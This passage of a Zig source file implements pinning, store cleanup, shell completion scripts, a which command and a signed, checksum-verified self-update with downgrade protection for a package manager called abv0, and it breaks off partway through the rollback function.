//! Extra commands: pin, unpin, pinned, cleanup, completions, which, self-update.
//!
//! Every command shares one signature so main.zig can dispatch them the same way:
//!
//!     pub fn cmdX(a: std.mem.Allocator, st: *store.Store, reg: ?*const registry.Registry, args: []const []const u8) !u8
//!
//!   * `a`    scratch allocator. Commands allocate through a local arena, so any
//!            allocator works; an arena is still the cheapest choice.
//!   * `st`   the store (paths and bin ownership).
//!   * `reg`  the loaded registry, or null when it is not available. Only `pin`
//!            uses it (to refuse unknown names); pass null to skip that check.
//!   * `args` the words after the command name, without the command itself.
//!
//! Return value is the process exit code: 0 success, 1 runtime failure,
//! 2 usage error (wrong arguments).
//!
//! Also exported for main.zig: `isPinned(st, a, name) bool`, so upgrade and
//! outdated can skip pinned packages.

const std = @import("std");
const builtin = @import("builtin");

const registry = @import("registry.zig");
const store = @import("store.zig");
const platform = @import("platform.zig");
const safepath = @import("safepath.zig");
const term = @import("term.zig");
const net = @import("net.zig");
const sign = @import("sign.zig");
const shim = @import("shim.zig");
const ghrelease = @import("ghrelease.zig");

const testing = std.testing;

const release_base_url = "https://raw.githubusercontent.com/gugu8intel-i9/abv0/main/release";
const sums_max_bytes = 64 * 1024;
const sig_max_bytes = 1024;
const day_ns: i128 = 24 * std.time.ns_per_hour;

// ---------------------------------------------------------------------------
// Pins
// ---------------------------------------------------------------------------

fn pinsPath(a: std.mem.Allocator, st: *const store.Store) ![]u8 {
    return std.fs.path.join(a, &.{ st.root, "state", "pins" });
}

/// Pinned names in file order. Strings are allocated from `a`.
fn readPins(a: std.mem.Allocator, st: *const store.Store) ![][]const u8 {
    var out = std.ArrayList([]const u8).init(a);
    errdefer out.deinit();

    const path = try pinsPath(a, st);
    const data = std.fs.cwd().readFileAlloc(a, path, 1024 * 1024) catch |e| switch (e) {
        error.FileNotFound => return out.toOwnedSlice(),
        else => return e,
    };

    var lines = std.mem.splitScalar(u8, data, '\n');
    while (lines.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        if (line.len == 0) continue;
        try out.append(try a.dupe(u8, line));
    }
    return out.toOwnedSlice();
}

fn containsName(names: []const []const u8, name: []const u8) bool {
    for (names) |n| {
        if (std.mem.eql(u8, n, name)) return true;
    }
    return false;
}

/// Replace the pin file atomically: write a temp file next to it, then rename.
fn writePins(a: std.mem.Allocator, st: *const store.Store, names: []const []const u8) !void {
    const state_dir = try std.fs.path.join(a, &.{ st.root, "state" });
    try platform.makeSecureDir(state_dir);

    const path = try pinsPath(a, st);
    const tmp = try std.fmt.allocPrint(a, "{s}.{x}.tmp", .{ path, std.crypto.random.int(u64) });

    writePinsFile(tmp, names) catch |e| {
        std.fs.cwd().deleteFile(tmp) catch {};
        return e;
    };
    std.fs.cwd().rename(tmp, path) catch |e| {
        std.fs.cwd().deleteFile(tmp) catch {};
        return e;
    };
}

fn writePinsFile(path: []const u8, names: []const []const u8) !void {
    const file = try std.fs.cwd().createFile(path, .{ .mode = platform.mode_private });
    defer file.close();
    for (names) |n| {
        try file.writeAll(n);
        try file.writeAll("\n");
    }
    try file.sync();
}

/// True when `name` is pinned. Any read failure counts as not pinned.
pub fn isPinned(st: *const store.Store, a: std.mem.Allocator, name: []const u8) bool {
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const names = readPins(arena.allocator(), st) catch return false;
    return containsName(names, name);
}

pub fn cmdPin(
    a: std.mem.Allocator,
    st: *store.Store,
    reg: ?*const registry.Registry,
    args: []const []const u8,
) !u8 {
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();

    if (args.len != 1) {
        term.err("usage: abv0 pin <package>\n", .{});
        return 2;
    }
    const name = args[0];
    if (!safepath.isValidId(name)) {
        term.err("{s}error{s}: '{s}' is not a valid package name\n", .{ term.red, term.reset, name });
        return 2;
    }
    if (reg) |r| {
        if (r.get(name) == null) {
            term.err("{s}error{s}: unknown package '{s}'\n", .{ term.red, term.reset, name });
            return 1;
        }
    }

    const current = try readPins(aa, st);
    if (containsName(current, name)) {
        term.print("{s} is already pinned\n", .{name});
        return 0;
    }
    var next = std.ArrayList([]const u8).init(aa);
    try next.appendSlice(current);
    try next.append(name);
    writePins(aa, st, next.items) catch |e| {
        term.err("{s}error{s}: cannot write pins ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    term.print("pinned {s}\n", .{name});
    return 0;
}

pub fn cmdUnpin(
    a: std.mem.Allocator,
    st: *store.Store,
    reg: ?*const registry.Registry,
    args: []const []const u8,
) !u8 {
    _ = reg;
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();

    if (args.len != 1) {
        term.err("usage: abv0 unpin <package>\n", .{});
        return 2;
    }
    const name = args[0];
    const current = try readPins(aa, st);
    if (!containsName(current, name)) {
        term.err("{s}error{s}: '{s}' is not pinned\n", .{ term.red, term.reset, name });
        return 1;
    }

    var next = std.ArrayList([]const u8).init(aa);
    for (current) |n| {
        if (!std.mem.eql(u8, n, name)) try next.append(n);
    }
    writePins(aa, st, next.items) catch |e| {
        term.err("{s}error{s}: cannot write pins ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    term.print("unpinned {s}\n", .{name});
    return 0;
}

pub fn cmdPinned(
    a: std.mem.Allocator,
    st: *store.Store,
    reg: ?*const registry.Registry,
    args: []const []const u8,
) !u8 {
    _ = reg;
    if (args.len != 0) {
        term.err("usage: abv0 pinned\n", .{});
        return 2;
    }
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();

    const names = try readPins(arena.allocator(), st);
    if (names.len == 0) {
        term.print("no pinned packages\n", .{});
        return 0;
    }
    for (names) |n| term.print("{s}\n", .{n});
    return 0;
}

// ---------------------------------------------------------------------------
// Cleanup
// ---------------------------------------------------------------------------

const Victim = struct {
    label: []const u8,
    path: []const u8,
    bytes: u64,
};

const StoreDir = struct {
    dir_name: []const u8,
    name: []const u8,
    platform: []const u8,
    version: []const u8,
};

/// Total size of the regular files under `path` (or the file itself).
fn treeSize(a: std.mem.Allocator, path: []const u8) u64 {
    var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch {
        const info = std.fs.cwd().statFile(path) catch return 0;
        return info.size;
    };
    defer dir.close();

    var walker = dir.walk(a) catch return 0;
    defer walker.deinit();

    var total: u64 = 0;
    while (walker.next() catch null) |entry| {
        if (entry.kind != .file) continue;
        const info = entry.dir.statFile(entry.basename) catch continue;
        total += info.size;
    }
    return total;
}

/// True when `path` has not been modified for longer than `ns`.
fn olderThan(path: []const u8, ns: i128) bool {
    const info = std.fs.cwd().statFile(path) catch return false;
    return std.time.nanoTimestamp() - info.mtime > ns;
}

/// Absolute targets of every symlink in the bin directory. A store directory
/// that a bin link still points at is kept, or the link would dangle.
fn linkTargets(a: std.mem.Allocator, st: *const store.Store) ![][]const u8 {
    // On Windows bins are launcher shims; their .shim files name the targets.
    if (platform.is_windows) return st.binShimTargets(a);
    var out = std.ArrayList([]const u8).init(a);

    var dir = std.fs.cwd().openDir(st.bin_root, .{ .iterate = true }) catch return out.toOwnedSlice();
    defer dir.close();

    var buf: [std.fs.MAX_PATH_BYTES]u8 = undefined;
    var it = dir.iterate();
    while (try it.next()) |entry| {
        const target = dir.readLink(entry.name, &buf) catch continue;
        if (std.fs.path.isAbsolute(target)) {
            try out.append(try a.dupe(u8, target));
        } else {
            try out.append(try std.fs.path.join(a, &.{ st.bin_root, target }));
        }
    }
    return out.toOwnedSlice();
}

fn isLinkedInto(dir_path: []const u8, targets: []const []const u8) bool {
    for (targets) |t| {
        if (!std.mem.startsWith(u8, t, dir_path)) continue;
        if (t.len == dir_path.len or t[dir_path.len] == std.fs.path.sep) return true;
    }
    return false;
}

/// Old versions: for each package and platform, every store directory whose
/// version is not the newest one installed.
fn collectOldVersions(a: std.mem.Allocator, st: *const store.Store, plan: *std.ArrayList(Victim)) !void {
    var dir = std.fs.cwd().openDir(st.store_root, .{ .iterate = true }) catch return;
    defer dir.close();

    var dirs = std.ArrayList(StoreDir).init(a);
    var it = dir.iterate();
    while (try it.next()) |entry| {
        if (entry.kind != .directory) continue;
        const parsed = store.Store.parseStoreDirName(entry.name) orelse continue;
        try dirs.append(.{
            .dir_name = try a.dupe(u8, entry.name),
            .name = try a.dupe(u8, parsed.name),
            .platform = try a.dupe(u8, parsed.platform),
            .version = try a.dupe(u8, parsed.version),
        });
    }
    if (dirs.items.len == 0) return;

    const targets = try linkTargets(a, st);
    // Bins are usually hard links, which readlink cannot see. After a
    // `switch` or `rollback` the active version is an older one.
    const bin_ids = try binFileIds(a, st);

    for (dirs.items) |d| {
        var newer_exists = false;
        for (dirs.items) |other| {
            if (!std.mem.eql(u8, other.name, d.name) or !std.mem.eql(u8, other.platform, d.platform)) continue;
            if (registry.compareVersions(other.version, d.version) == .gt) {
                newer_exists = true;
                break;
            }
        }
        if (!newer_exists) continue;

        const path = try std.fs.path.join(a, &.{ st.store_root, d.dir_name });
        if (isLinkedInto(path, targets) or treeHoldsBin(a, path, bin_ids, false) or treeHoldsBin(a, path, bin_ids, true)) {
            term.print("kept {s} {s}: a bin link still points at it\n", .{ d.name, d.version });
            continue;
        }
        try plan.append(.{
            .label = try std.fmt.allocPrint(a, "old version {s} {s}", .{ d.name, d.version }),
            .path = path,
            .bytes = treeSize(a, path),
        });
    }
}

/// `*.tmp` entries in the store that have not been touched for 24 hours.
fn collectStaleTmp(a: std.mem.Allocator, st: *const store.Store, plan: *std.ArrayList(Victim)) !void {
    var dir = std.fs.cwd().openDir(st.store_root, .{ .iterate = true }) catch return;
    defer dir.close();

    var it = dir.iterate();
    while (try it.next()) |entry| {
        if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
        const path = try std.fs.path.join(a, &.{ st.store_root, entry.name });
        if (!olderThan(path, day_ns)) continue;
        try plan.append(.{
            .label = try std.fmt.allocPrint(a, "stale temp {s}", .{entry.name}),
            .path = path,
            .bytes = treeSize(a, path),
        });
    }
}

fn formatBytes(buf: []u8, n: u64) []const u8 {
    const units = [_][]const u8{ "B", "KiB", "MiB", "GiB", "TiB" };
    if (n < 1024) return std.fmt.bufPrint(buf, "{d} B", .{n}) catch "?";
    var v: f64 = @floatFromInt(n);
    var u: usize = 0;
    while (v >= 1024 and u < units.len - 1) : (u += 1) v /= 1024;
    return std.fmt.bufPrint(buf, "{d:.1} {s}", .{ v, units[u] }) catch "?";
}

pub fn cmdCleanup(
    a: std.mem.Allocator,
    st: *store.Store,
    reg: ?*const registry.Registry,
    args: []const []const u8,
) !u8 {
    _ = reg;
    var dry_run = false;
    for (args) |arg| {
        if (std.mem.eql(u8, arg, "--dry-run")) {
            dry_run = true;
        } else {
            term.err("usage: abv0 cleanup [--dry-run]\n", .{});
            return 2;
        }
    }

    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();

    var plan = std.ArrayList(Victim).init(aa);
    try collectOldVersions(aa, st, &plan);
    try collectStaleTmp(aa, st, &plan);

    // The download cache and the shared-file store are trimmed by their own
    // code (cas.zig). A dry run counts what is orphaned right now; the real
    // run prunes after the old versions above are gone, so it also frees the
    // shared files only those versions used.
    const cache_now = st.pruneCache(aa, true);
    const cas_now = st.pruneCas(aa, true);

    if (plan.items.len == 0 and cache_now.files == 0 and cas_now.files == 0) {
        term.print("nothing to clean\n", .{});
        return 0;
    }

    var failed = false;
    var reclaimed: u64 = 0;
    var total: u64 = 0;
    var size_buf: [32]u8 = undefined;
    for (plan.items) |v| {
        total += v.bytes;
        const size = formatBytes(&size_buf, v.bytes);
        if (dry_run) {
            term.print("would remove {s}: {s} ({s})\n", .{ v.label, v.path, size });
            continue;
        }
        std.fs.cwd().deleteTree(v.path) catch |e| {
            term.err("{s}error{s}: cannot remove {s}: {s}\n", .{ term.red, term.reset, v.path, @errorName(e) });
            failed = true;
            continue;
        };
        reclaimed += v.bytes;
        term.print("removed {s}: {s} ({s})\n", .{ v.label, v.path, size });
    }

    const cache_done = if (dry_run) cache_now else st.pruneCache(aa, false);
    const cas_done = if (dry_run) cas_now else st.pruneCas(aa, false);
    const verb: []const u8 = if (dry_run) "would remove" else "removed";
    if (cache_done.files > 0) {
        term.print("{s} download cache: {d} stale entries ({s})\n", .{ verb, cache_done.files, formatBytes(&size_buf, cache_done.bytes) });
    }
    if (cas_done.files > 0) {
        term.print("{s} shared files: {d} unused ({s})\n", .{ verb, cas_done.files, formatBytes(&size_buf, cas_done.bytes) });
    }
    total += cache_done.bytes + cas_done.bytes;
    reclaimed += cache_done.bytes + cas_done.bytes;

    if (dry_run) {
        term.print("would reclaim {s}\n", .{formatBytes(&size_buf, total)});
    } else {
        term.print("reclaimed {s}\n", .{formatBytes(&size_buf, reclaimed)});
    }
    return if (failed) 1 else 0;
}

// ---------------------------------------------------------------------------
// Shell completions
// ---------------------------------------------------------------------------

const commands_list = "help version list search info install uninstall outdated upgrade run shell bundle doctor fix detect reset sync update gc report benchmark pin unpin pinned cleanup completions which self-update deps uses leaves switch rollback history undo home migrate";

/// Commands whose argument is a package name.
const name_commands_space = "info install uninstall upgrade run shell pin unpin deps uses switch rollback home";

/// The same list with `|` separators, for shell case patterns.
const name_commands_pipe = "info|install|uninstall|upgrade|run|shell|pin|unpin|deps|uses|switch|rollback|home";

/// Package names come from `abv0 list`. Name lines are the only lines that
/// start at column 0 and have exactly two fields (name and version). The
/// description lines are indented, and the summary is "N packages".
const bash_script =
    \\# abv0 bash completion. Load with: source <(abv0 completions bash)
    \\_abv0_pkgs() {
    \\  abv0 list 2>/dev/null | awk 'NF == 2 && $2 != "packages" && !/^[[:space:]]/ { print $1 }'
    \\}
    \\_abv0() {
    \\  local cur prev
    \\  cur="${COMP_WORDS[COMP_CWORD]}"
    \\  prev="${COMP_WORDS[COMP_CWORD-1]}"
    \\  if [ "$COMP_CWORD" -eq 1 ]; then
    \\    COMPREPLY=( $(compgen -W "
++ commands_list ++
    \\" -- "$cur") )
    \\    return 0
    \\  fi
    \\  case "$prev" in
    \\
++ name_commands_pipe ++
    \\)
    \\      COMPREPLY=( $(compgen -W "$(_abv0_pkgs)" -- "$cur") ) ;;
    \\    completions)
    \\      COMPREPLY=( $(compgen -W "bash zsh fish pwsh" -- "$cur") ) ;;
    \\    *)
    \\      COMPREPLY=( $(compgen -f -- "$cur") ) ;;
    \\  esac
    \\}
    \\complete -F _abv0 abv0
    \\
;

const zsh_script =
    \\# abv0 zsh completion. Load with: source <(abv0 completions zsh) after compinit
    \\_abv0_pkgs() {
    \\  local -a pkgs
    \\  pkgs=( ${(f)"$(abv0 list 2>/dev/null | awk 'NF == 2 && $2 != "packages" && !/^[[:space:]]/ { print $1 }')"} )
    \\  compadd -- $pkgs
    \\}
    \\_abv0() {
    \\  local -a cmds
    \\  if (( CURRENT == 2 )); then
    \\    cmds=(
++ commands_list ++
    \\ )
    \\    compadd -- $cmds
    \\    return
    \\  fi
    \\  case $words[2] in
    \\
++ name_commands_pipe ++
    \\)
    \\      _abv0_pkgs ;;
    \\    completions)
    \\      compadd -- bash zsh fish pwsh ;;
    \\    *)
    \\      _files ;;
    \\  esac
    \\}
    \\(( $+functions[compdef] )) && compdef _abv0 abv0
    \\
;

const fish_script =
    \\# abv0 fish completion. Load with: abv0 completions fish | source
    \\function __abv0_pkgs
    \\    abv0 list 2>/dev/null | awk 'NF == 2 && $2 != "packages" && !/^[[:space:]]/ { print $1 }'
    \\end
    \\complete -c abv0 -f
    \\complete -c abv0 -n __fish_use_subcommand -a "
++ commands_list ++
    \\"
    \\complete -c abv0 -n "__fish_seen_subcommand_from
++ name_commands_space ++
    \\" -a "(__abv0_pkgs)"
    \\complete -c abv0 -n "__fish_seen_subcommand_from completions" -a "bash zsh fish pwsh"
    \\
;

const pwsh_script =
    \\# abv0 PowerShell completion. Load with: abv0 completions pwsh | Out-String | Invoke-Expression
    \\Register-ArgumentCompleter -Native -CommandName abv0 -ScriptBlock {
    \\    param($wordToComplete, $commandAst, $cursorPosition)
    \\    $elements = @($commandAst.CommandElements)
    \\    $pos = if ($wordToComplete -eq '') { $elements.Count } else { $elements.Count - 1 }
    \\    $cands = @()
    \\    if ($pos -le 1) {
    \\        $cands = '
++ commands_list ++
    \\'.Split(' ')
    \\    } elseif ($pos -ge 2) {
    \\        $sub = $elements[1].ToString()
    \\        if ($sub -in '
++ name_commands_space ++
    \\'.Split(' ')) {
    \\            $cands = @(abv0 list 2>$null | Where-Object { $_ -match '^\S+\s+\S+$' -and $_ -notmatch '^\d+ packages$' } | ForEach-Object { ($_ -split '\s+')[0] })
    \\        } elseif ($sub -eq 'completions') {
    \\            $cands = @('bash', 'zsh', 'fish', 'pwsh')
    \\        }
    \\    }
    \\    $cands | Where-Object { $_ -like "$wordToComplete*" } | ForEach-Object {
    \\        [System.Management.Automation.CompletionResult]::new($_, $_, 'ParameterValue', $_)
    \\    }
    \\}
    \\
;

/// The completion script for `shell`, or null for an unknown shell.
pub fn completionScript(shell: []const u8) ?[]const u8 {
    if (std.mem.eql(u8, shell, "bash")) return bash_script;
    if (std.mem.eql(u8, shell, "zsh")) return zsh_script;
    if (std.mem.eql(u8, shell, "fish")) return fish_script;
    if (std.mem.eql(u8, shell, "pwsh")) return pwsh_script;
    return null;
}

pub fn cmdCompletions(
    a: std.mem.Allocator,
    st: *store.Store,
    reg: ?*const registry.Registry,
    args: []const []const u8,
) !u8 {
    _ = a;
    _ = st;
    _ = reg;
    if (args.len != 1) {
        term.err("usage: abv0 completions <bash|zsh|fish|pwsh>\n", .{});
        return 2;
    }
    const script = completionScript(args[0]) orelse {
        term.err("{s}error{s}: unknown shell '{s}' (bash, zsh, fish, pwsh)\n", .{ term.red, term.reset, args[0] });
        return 2;
    };
    term.writeAll(script);
    return 0;
}

// ---------------------------------------------------------------------------
// which
// ---------------------------------------------------------------------------

pub fn cmdWhich(
    a: std.mem.Allocator,
    st: *store.Store,
    reg: ?*const registry.Registry,
    args: []const []const u8,
) !u8 {
    _ = reg;
    if (args.len != 1) {
        term.err("usage: abv0 which <bin>\n", .{});
        return 2;
    }
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();

    const bin = args[0];
    const owner = try st.binOwnerOf(aa, bin) orelse {
        term.err("{s}error{s}: '{s}' is not managed by abv0\n", .{ term.red, term.reset, bin });
        return 1;
    };

    const file_name = try std.fmt.allocPrint(aa, "{s}{s}", .{ bin, platform.exe_suffix });
    const link_path = try std.fs.path.join(aa, &.{ st.bin_root, file_name });

    term.print("{s}link{s}     {s}\n", .{ term.dim, term.reset, link_path });

    // A launcher shim (Windows): `<bin>.shim` names the real executable.
    const shim_path = try std.fmt.allocPrint(aa, "{s}{c}{s}{s}", .{ st.bin_root, std.fs.path.sep, bin, shim.shim_suffix });
    if (shim.readShimFile(aa, shim_path)) |s| {
        term.print("{s}store{s}    {s}\n", .{ term.dim, term.reset, s.path });
        if (!platform.pathExists(s.path)) {
            term.print("{s}warning{s}  the shim target is missing; run `abv0 fix`\n", .{ term.yellow, term.reset });
        }
        term.print("{s}package{s}  {s}\n", .{ term.dim, term.reset, owner });
        return 0;
    } else |_| {}

    var buf: [std.fs.MAX_PATH_BYTES]u8 = undefined;
    if (std.fs.cwd().readLink(link_path, &buf)) |target| {
        const abs = if (std.fs.path.isAbsolute(target))
            try aa.dupe(u8, target)
        else
            try std.fs.path.join(aa, &.{ st.bin_root, target });
        term.print("{s}store{s}    {s}\n", .{ term.dim, term.reset, abs });
        if (!platform.pathExists(abs)) {
            term.print("{s}warning{s}  the store path is missing; run `abv0 fix`\n", .{ term.yellow, term.reset });
        }
    } else |_| {
        term.print("{s}store{s}    (not a symlink: copy or hard link)\n", .{ term.dim, term.reset });
    }
    term.print("{s}package{s}  {s}\n", .{ term.dim, term.reset, owner });
    return 0;
}

// ---------------------------------------------------------------------------
// self-update
// ---------------------------------------------------------------------------

/// Release asset name for a target, as listed in release/SHA256SUMS and built
/// by the build.zig release step. Null when no release is published for it.
pub fn assetName(os: std.Target.Os.Tag, arch: std.Target.Cpu.Arch) ?[]const u8 {
    return switch (os) {
        .linux => switch (arch) {
            .x86_64 => "abv0-linux-x86_64",
            .aarch64 => "abv0-linux-aarch64",
            else => null,
        },
        .macos => switch (arch) {
            .x86_64 => "abv0-darwin-x86_64",
            .aarch64 => "abv0-darwin-arm64",
            else => null,
        },
        .windows => switch (arch) {
            .x86_64 => "abv0-windows-x86_64.exe",
            .aarch64 => "abv0-windows-aarch64.exe",
            else => null,
        },
        else => null,
    };
}

/// Look up `asset` in SHA256SUMS text. Lines have the `sha256sum` form
/// `<64 hex>  <name>`, and binary mode `<64 hex> *<name>` is accepted too.
/// Returns the hex digits (as written in the file), or null when the asset is
/// not listed or its digest is malformed.
pub fn findChecksum(sums: []const u8, asset: []const u8) ?[]const u8 {
    var lines = std.mem.splitScalar(u8, sums, '\n');
    while (lines.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        const sep = std.mem.indexOfAny(u8, line, " \t") orelse continue;
        const hex = line[0..sep];
        const name = std.mem.trimLeft(u8, line[sep..], " \t*");
        if (!std.mem.eql(u8, name, asset)) continue;

        if (hex.len != 64) return null;
        for (hex) |c| {
            if (!std.ascii.isHex(c)) return null;
        }
        return hex;
    }
    return null;
}

/// Lowercase hex SHA-256 of the file at `path`.
fn sha256File(path: []const u8) ![64]u8 {
    const file = try std.fs.cwd().openFile(path, .{});
    defer file.close();

    var hasher = std.crypto.hash.sha2.Sha256.init(.{});
    var buf: [64 * 1024]u8 = undefined;
    while (true) {
        const n = try file.read(&buf);
        if (n == 0) break;
        hasher.update(buf[0..n]);
    }
    var digest: [std.crypto.hash.sha2.Sha256.digest_length]u8 = undefined;
    hasher.final(&digest);
    return std.fmt.bytesToHex(digest, .lower);
}

/// The version in `abv0 X.Y.Z (target)`, the first line `--version` prints.
pub fn versionFromOutput(out: []const u8) ?[]const u8 {
    const line = std.mem.sliceTo(out, '\n');
    if (!std.mem.startsWith(u8, line, "abv0 ")) return null;
    const rest = line["abv0 ".len..];
    const v = rest[0 .. std.mem.indexOfAny(u8, rest, " \r") orelse rest.len];
    if (v.len == 0 or !std.ascii.isDigit(v[0])) return null;
    return v;
}

pub fn cmdSelfUpdate(
    a: std.mem.Allocator,
    st: *store.Store,
    current_version: []const u8,
    args: []const []const u8,
) !u8 {
    var check_only = false;
    var rollback = false;
    for (args) |arg| {
        if (std.mem.eql(u8, arg, "--check")) {
            check_only = true;
        } else if (std.mem.eql(u8, arg, "--rollback")) {
            rollback = true;
        } else {
            term.err("usage: abv0 self-update [--check | --rollback]\n", .{});
            return 2;
        }
    }

    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();
    if (rollback) return selfRollback(aa, st, current_version);

    const asset = assetName(builtin.os.tag, builtin.cpu.arch) orelse {
        term.err("{s}error{s}: no abv0 release is published for this platform\n", .{ term.red, term.reset });
        return 1;
    };

    // 1. Fetch the checksum list and its signature, then verify the signature
    //    before any digest in the list is trusted.
    const sums_url = release_base_url ++ "/SHA256SUMS";
    const sums = net.fetchToString(aa, sums_url, sums_max_bytes, .{}) catch |e| {
        term.err("{s}error{s}: cannot fetch SHA256SUMS ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    const sig = net.fetchToString(aa, sums_url ++ ".sig", sig_max_bytes, .{}) catch |e| {
        term.err("{s}error{s}: cannot fetch SHA256SUMS.sig ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    sign.verify(sums, sig) catch |e| {
        term.err("{s}error{s}: SHA256SUMS signature check failed ({s}); not updating\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };

    const expected = findChecksum(sums, asset) orelse {
        term.err("{s}error{s}: SHA256SUMS has no valid entry for {s}\n", .{ term.red, term.reset, asset });
        return 1;
    };

    // 2. Compare against the running binary.
    const exe_path = std.fs.selfExePathAlloc(aa) catch |e| {
        term.err("{s}error{s}: cannot locate the running binary ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    const current = sha256File(exe_path) catch |e| {
        term.err("{s}error{s}: cannot hash {s} ({s})\n", .{ term.red, term.reset, exe_path, @errorName(e) });
        return 1;
    };
    if (std.ascii.eqlIgnoreCase(&current, expected)) {
        term.print("already up to date\n", .{});
        return 0;
    }
    if (check_only) {
        term.print("update available: {s} (current build differs from the published {s})\n", .{ asset, asset });
        return 0;
    }

    // 3. Download next to the running binary, so the final rename stays on one
    //    filesystem and is atomic.
    const exe_dir = std.fs.path.dirname(exe_path) orelse {
        term.err("{s}error{s}: cannot find the directory of {s}\n", .{ term.red, term.reset, exe_path });
        return 1;
    };
    var rand_buf: [8]u8 = undefined;
    std.crypto.random.bytes(&rand_buf);
    const tmp_name = try std.fmt.allocPrint(aa, "abv0-update-{s}.tmp", .{std.fmt.bytesToHex(rand_buf, .lower)});
    const tmp_path = try std.fs.path.join(aa, &.{ exe_dir, tmp_name });

    const asset_url = try std.fmt.allocPrint(aa, "{s}/{s}", .{ release_base_url, asset });
    term.print("downloading {s}\n", .{asset_url});
    net.download(aa, asset_url, tmp_path, .{}) catch |e| {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: download failed ({s}); the current binary is unchanged\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };

    // 4. Verify, make executable, and sanity-check that it runs.
    const got = sha256File(tmp_path) catch |e| {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: cannot hash the download ({s})\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    if (!std.ascii.eqlIgnoreCase(&got, expected)) {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: download does not match SHA256SUMS; the current binary is unchanged\n", .{ term.red, term.reset });
        return 1;
    }
    platform.chmodPath(tmp_path, platform.mode_bin);

    const sanity = std.process.Child.run(.{
        .allocator = aa,
        .argv = &.{ tmp_path, "--version" },
        .max_output_bytes = 64 * 1024,
    }) catch |e| {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: the new binary does not run ({s}); the current binary is unchanged\n", .{ term.red, term.reset, @errorName(e) });
        return 1;
    };
    if (sanity.term != .Exited or sanity.term.Exited != 0) {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: the new binary failed `--version`; the current binary is unchanged\n", .{ term.red, term.reset });
        return 1;
    }
    // 4b. Never go back. An old SHA256SUMS keeps a valid signature forever, so
    //     whoever can serve old release files could otherwise roll every user
    //     back to a version with known holes.
    const new_version = versionFromOutput(sanity.stdout) orelse {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: the new binary does not report its version; the current binary is unchanged\n", .{ term.red, term.reset });
        return 1;
    };
    if (registry.compareVersions(new_version, current_version) == .lt) {
        std.fs.cwd().deleteFile(tmp_path) catch {};
        term.err("{s}error{s}: the published build is {s}, older than this {s}; not downgrading\n", .{ term.red, term.reset, new_version, current_version });
        return 1;
    }

    // 5. Keep the running binary, so `self-update --rollback` can return to it.
    const kept = keepPrevious(aa, st, exe_path);
    if (!swapExe(aa, exe_path, tmp_path)) return 1;

    term.print("{s}updated{s} to {s} {s} (sha256 {s})\n", .{ term.green, term.reset, asset, new_version, expected });
    if (kept) term.print("  the previous abv0 {s} is kept: `abv0 self-update --rollback` returns to it\n", .{current_version});
    return 0;
}

fn previousExePath(a: std.mem.Allocator, st: *const store.Store) ![]u8 {
    return std.fs.path.join(a, &.{ st.root, "self", if (platform.is_windows) "abv0-previous.exe" else "abv0-previous" });
}

/// Copy the running binary to the abv0 folder. A failure only means no
/// rollback later, so it is reported and the update goes on.
fn keepPrevious(a: std.mem.Allocator, st: *const store.Store, exe_path: []const u8) bool {
    const dest = previousExePath(a, st) catch return false;
    if (std.fs.path.dirname(dest)) |d| std.fs.cwd().makePath(d) catch return false;
    std.fs.cwd().copyFile(exe_path, std.fs.cwd(), dest, .{}) catch |e| {
        term.err("{s}warning{s}: could not keep the current abv0 for rollback ({s})\n", .{ term.yellow, term.reset, @errorName(e) });
        return false;
    };
    platform.chmodPath(dest, platform.mode_bin);
    return true;
}

/// Put `tmp_path` where the running binary is. Unix can rename over a running
/// executable. Windows cannot, so the running one is moved aside first and
/// put back on failure. `tmp_path` is gone afterwards either way.
fn swapExe(a: std.mem.Allocator, exe_path: []const u8, tmp_path: []const u8) bool {
    if (platform.is_windows) {
        const old_path = std.fmt.allocPrint(a, "{s}.old", .{exe_path}) catch return false;
        std.fs.cwd().deleteFile(old_path) catch {};
        std.fs.cwd().rename(exe_path, old_path) catch |e| {
            std.fs.cwd().deleteFile(tmp_path) catch {};
            term.err("{s}error{s}: cannot move the running binary aside ({s})\n", .{ term.red, term.reset, @errorName(e) });
            return false;
        };
        std.fs.cwd().rename(tmp_path, exe_path) catch |e| {
            std.fs.cwd().rename(old_path, exe_path) catch {};
            std.fs.cwd().deleteFile(tmp_path) catch {};
            term.err("{s}error{s}: cannot install the new binary ({s}); restored the old one\n", .{ term.red, term.reset, @errorName(e) });
            return false;
        };
    } else {
        std.fs.cwd().rename(tmp_path, exe_path) catch |e| {
            std.fs.cwd().deleteFile(tmp_path) catch {};
            term.err("{s}error{s}: cannot replace {s} ({s})\n", .{ term.red, term.reset, exe_path, @errorName(e) });
            return false;
        };
    }
    return true;
}

/// `self-update --rollback`: go back to the abv0 the last self-update
/// replaced. The two swap places, so running it again goes forward.
fn selfRollback(aa: std.mem.Allocator, st: *const store.Store, current_version: []const u8) !u8 {
    const saved = try previousExePath(aa, st);
    std.fs.cwd().access(saved, .{}) catch {
